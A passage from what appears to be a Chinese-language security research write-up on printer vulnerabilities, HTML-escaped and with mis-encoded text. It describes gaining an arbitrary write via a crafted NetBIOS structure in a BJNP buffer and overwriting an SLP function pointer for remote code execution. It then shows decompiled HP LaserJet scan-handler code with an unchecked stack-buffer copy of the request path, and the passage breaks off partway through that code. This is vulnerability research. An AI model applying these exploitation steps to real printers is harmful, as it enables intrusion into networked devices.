      &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2396&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;assset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqendapp/IMP/nq/ndinname.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED30DC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2372&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
   
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÂèØ‰ª•ÁúãÂà∞ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[3]&lt;/code&gt; ÊúÉÊää response_buf-&amp;gt;id ÂØ´Êàê nbinfo-&amp;gt;id„ÄÇ&lt;/p&gt;

&lt;p&gt;‰πüÂ∞±ÊòØË™™ÔºåÂ¶ÇÊûúÊàëÂÄëÂèØ‰ª•Ë¶ÜËìãÊéâ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nb_info&lt;/code&gt; ÁµêÊßãÔºå‰∏¶‰∏îÊßãÈÄ† &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adapter&lt;/code&gt; ÊàëÂÄëÂ∞±ÊúÉÊúâ‰∏ÄÂÄã‰ªªÊÑèË®òÊÜ∂È´îÂØ´ÂÖ•ÔºåËÄåÂØ¶Èöõ‰∏äÊßãÈÄ†ÊñπÂºèÂæàÁ∞°ÂñÆÔºåÂè™Ë¶ÅÊâæÂÄã Global Buffer ÂéªÊßãÈÄ†Â∞±ÂèØ‰ª•‰∫ÜÔºåÊàëÂÄëÈÄôÈÇäÈÅ∏Êìá‰∫Ü BJNP Session Buffer ÂéªÊßãÈÄ†ÊàëÂÄëÁµêÊßã„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231106/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ËÄåÂú®ÊàëÂÄëÊúâ‰ªªÊÑèÂØ´ÂÖ•‰πãÂæåÔºåÊàëÂÄëÂèØ‰ª•Ë¶ÜËìã SLP ÁöÑÂáΩÊï∏ÊåáÈáù‰æÜÈÅîÊàê RCEÔºåÂæåÁ∫åÂà©Áî®Â∞±ËàáÂâçËø∞Áõ∏ÂêåÔºåÈÄôÈÇäÂ∞±‰∏çÂè¶Â§ñÂ§öÂÅö‰ªãÁ¥π‰∫Ü„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;hp-1&quot;&gt;HP&lt;/h3&gt;

&lt;p&gt;ÈÄôÊ¨°ÁõÆÊ®ôÊòØ HP Collor LaserJet Pro M479fdw ÈÄôÂè∞Âç∞Ë°®Ê©üÔºåÂÖ∂‰∏ªË¶ÅÊòØ Linux Base ÁöÑÔºåÂàÜÊûêËµ∑‰æÜÁõ∏Â∞çÂñÆÁ¥îÂæàÂ§öÔºåËÄåÂÖ∂‰∏≠ Web Service Â∫ï‰∏ãÊúâË®±Â§öÁöÑ cgi ‰æÜÊèê‰æõÂêÑÁ®Æ‰∏çÂêåÁöÑÂç∞Ë°®Ê©üÊìç‰ΩúÔºåÈÄô‰∫õÈÉΩÊòØÈÄèÈÅé FastCGI ÊñπÂºè‰æÜÈÅã‰ΩúÔºåÂèØÂèÉËÄÉ nginx config ‰æÜÁúãÊØèÂÄã path ÂàÜÂà•Â∞çÊáâÂà∞Âì™ÂÄã Port ÂèäÂì™ÂÄã Service&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Sirius/rom/httpmgr_nginx/ledm.conf&lt;/code&gt;
&lt;img src=&quot;/assets/img/blog/20231106/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;/usr/bin/local/slanapp&lt;/strong&gt; Ë≤†Ë≤¨ËôïÁêÜ scan Áõ∏ÈóúÁöÑÊìç‰ΩúÔºå‰∏ªË¶Å listen Âú® 127.0.0.1:14030&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231106/7.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Áï∂ÊàëÂÄëÂ≠òÂèñ /Scan/Jobs Ë∑ØÂæëÊôÇÔºåÂ∞±ÊúÉÈÄèÈÅéÈÄôÂÄã cgi ‰æÜËôïÁêÜ&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ÊºèÊ¥û‰ΩçÁΩÆ&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Áï∂ HP ËôïÁêÜ /Scan/Jobs Â∫ï‰∏ãÁöÑ get Ë´ãÊ±ÇÊôÇÔºåÊúÉ‰ΩøÁî® rest_scan_handle_get_request ‰æÜËôïÁêÜÔºåÂêåÊôÇ‰πüÊúÉÂ∞á pathinfo ‰∏ÄËµ∑ÂÇ≥ÂÖ•&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rest_scan_handle_get_request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pathinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pathinfo_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;httpmgr_fptrtbl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r2&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;httpmgr_fptrtbl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r4&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r3&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// t1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r5&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r5&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r7&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r8&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;first_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+8h] [bp-D8h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;second_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+28h] [bp-B8h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pagenumber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;152&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+48h] [bp-98h] BYREF&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/Scan/UserReadyToScan&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x15u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/Scan/Jobs&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xAu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pathinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xDF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;first_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_37:&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;_DEBUG_syslog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;REST_SCAN_DEBUG&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x411FA215&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pathinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;//------------------------------------------------------ [2]  &lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;/&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;first_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;first_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;/&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pagenumber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;first_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xDF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;second_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Pages&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dword_5DBC8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strtol&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;first_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_37&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v24&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strtol&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pagenumber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
